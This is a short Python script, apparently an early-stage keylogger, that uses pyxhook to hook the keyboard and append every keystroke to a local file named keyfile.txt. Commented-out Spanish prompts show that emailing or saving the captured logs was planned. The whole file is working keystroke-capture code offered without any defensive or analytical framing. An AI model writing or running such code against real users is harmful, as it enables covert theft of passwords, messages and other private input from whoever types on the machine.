import pyxhook

respuesta_afirmativa = ("yes", "y")

def callback(event):
    with open("keyfile.txt", "a") as logKey: 
        logKey.write(f"{event.Key}\n")
    return True 
     
if __name__ == "__main__":
    # enviar = input("¿Deseas enviar los registros por email?[y/n]") in respuesta_afirmativa  
    # guardar = input("¿Deseas guardar los registros en texto plano?[y/n]") in respuesta_afirmativa
    
    hm = pyxhook.HookManager()
    hm.KeyDown = callback
    hm.HookKeyboard()
    hm.start()